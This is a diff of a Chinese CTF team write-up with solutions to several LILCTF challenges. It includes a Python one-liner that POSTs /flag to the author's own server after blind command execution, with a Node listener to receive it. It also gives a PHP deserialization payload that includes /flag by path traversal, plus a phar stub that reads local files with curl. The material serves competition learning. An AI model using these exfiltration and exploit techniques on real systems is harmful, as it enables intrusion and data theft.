@@ -363,21 +363,25 @@ flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
 
 很难不注意到这里。那应该是要从这个 UUID v8 入手。装了 python 3.14 rc2 来测试数值，每次的结果都不一样。
 
-啊，那肯定和那个 random.seed() 有关啦。在靶机上随便注册一个账户后就能收到 SERVER_START_TIME。
+啊，那肯定和那个 random.seed() 有关啦。在靶机上随便注册一个账户后就能收到服务器每秒发送的时间数据(JSON)，里面就有 SERVER_START_TIME。在本地生成 UUID 时将此值作为 seed，再按照原本逻辑生成 UUID 就好了。
 
-在恢复 admin 密码页面用生成的 UUID 就可以改密码了。
+在恢复 admin 密码页面点击忘记密码，再填写生成的 UUID 就可以改密码了。
 
 ![](img/Snipaste_2025-08-15_22-29-29.webp)
 
-靶机可以出网，拿自己的主机开了个 HTTP 服务，响应固定的 JSON 数据。
+靶机可以出网，于是拿自己的主机开了个 HTTP 服务，响应固定的 JSON 数据（date 字段值为 2066 年之后的日期）。
 
-然后开始任意执行命令拿 flag。执行命令是看不到输出的。最开始用 cat /flag > /www/index.php 再刷新页面，发现行不通，可能 bottle 提前把这些 templates 读到内存里了吧。
+然后就能任意执行命令拿 flag 啦！执行命令后在 web 上是看不到输出的。最开始用 `cat /flag > /www/dashboard.htm` (也试过 template 目录中的其它 .htm) 再刷新页面，发现行不通，可能 bottle 提前把这些 templates 读到内存里了吧。
 
-用了不少办法，感觉缺很多基本工具 (curl 等等)，最后想到靶机后端强大的 python。
+那不如再试试拿自己的主机接收输出吧，拿 curl 试了半天愣是什么都没接收到，可能比赛环境就没有 curl 这些基本工具。。
+
+最后想到靶机后端强大的 python：
 
 ```python
 python -c "import os;import http.client;conn = http.client.HTTPConnection('{我的服务器}');str=open('/flag', 'r', encoding='utf-8').read();conn.request('POST', '/upload', body=str)"
 ```
+
+在我的机器上执行 node.js 开启 HTTP 服务：
 
 ```JavaScript
 const express = require('express');
@@ -397,6 +401,8 @@ app.listen(20098, () => {
 ```
 
 ![](img/Snipaste_2025-08-15_23-57-25.webp)
+
+第一次还把上面 init.sh 中的 FLAG 给交了（）
 
 ## \[crypto\] Space Travel
 解题者：Ishisashi
@@ -718,7 +724,7 @@ zsteg 找的隐写的 flag2(base64) 和 zlib。后面就不会了，因为注意
 
 嗯神秘字符串呢，那就试着解解看吧。
 
-与 `LILCTF{` 对照着看，很快就能发现规律：密文每个字符从头开始加 1，下一个字符减 1，依次计算就能得到 flag。
+与 `LILCTF{` 对照着看，很快就能发现规律：密文从第一个字符开始加 1，下一个字符减 1，依次计算就能得到 flag。
 
 ```
 KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|
@@ -839,7 +845,7 @@ LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}
 
 题目给了源码，最下面的反序列函数可以用于创建对象。那我们要创建一个 admin 账户！
 
-"admin" 那里没有严格等于，真是太好啦，那我们就让创建的账户 admin 字段直接为 true(bool)。绕过 admin 那后面的 `Access":` 就不用管了。
+"admin" 那里没有严格等于，真是太好啦，那我们就让创建的账户 admin 字段直接为 true(bool)。绕过 admin 之后那后面的 `Access":` 字符串检测就不用管了。
 
 本地 PHP 里把对象构造好，调用 serialize() 之后 POST 过去。Payload:
 
@@ -847,7 +853,7 @@ LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}
 a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:72:"O:6:"Access":2:{s:9:"\0*\0prefix";s:1:"/";s:9:"\0*\0suffix";s:8:"/../flag";}";}}
 ```
 
-这样就可以 include /lilctf/../flag 把 flag 显示出来。
+题目中会拼接字符串 prefix + "lilctf" + suffix 并作为 include 参数执行，而 payload 这样就可以 `include(""/lilctf/../flag")` 把 flag 显示出来。反序列化函数能自动处理这种多重双引号而无需转义，很欣慰。
 
 本地 PHP 8.4.11 测试时，直接传对象的序列化是可以按预期工作的，但到靶机上就不行。根据响应得知靶机 PHP 版本为 5.6.40。
 
@@ -1008,12 +1014,14 @@ LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 ```
 其实我不应该交这个 Flag 的。原本打算留给昌九提交，但脑子还是没有跟上手。十分后悔。
 
-## \[web\] php_jail_is_my_cry
+## \[web\] php_jail_is_my_cry (未解出)
 解题者：RenzukaCtone
 
 在本题上花了最多时间，最后也没有解出来。
 
 构造 phar 并进行 gzip 压缩可以绕过 php 检测，但怎么 jail 就不会了。
+
+构造自定义 STUB 的 phar：
 
 ```php
 <?php
@@ -1028,7 +1036,6 @@ $stub = <<<STUB
 <?php
     $ch = curl_init("file:///flag");
     curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
-    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $data = curl_exec($ch);
 	echo $data;
@@ -1041,9 +1048,17 @@ $phar->setStub($stub);
 echo "Built compressed: $pharFile\n";
 ```
 
+再用 gzip 压一次就可以绕过关键词检测了。
+
+看了 phpinfo 和 php.ini，禁用了大量基本函数和类，完全无从下手。
+
+把在 open_basename 内的 index.php 拿出来看看，说不定能从隐藏的那行代码中找到什么线索：
+
 ![](img/Snipaste_2025-08-17_22-03-06.webp)
 
-好累啊唉唉唉
+curl 绕过 open_basename 吗，可我一执行 curl 相关函数就报错，明明在 index.php 里完全没问题。
+
+到这一步离比赛只剩一个小时了，没找到最后的突破口实在可惜。
 
 ## Omake：队名
 ![](img/a37f94ff84e6322c97e33202b6db98fb.webp)
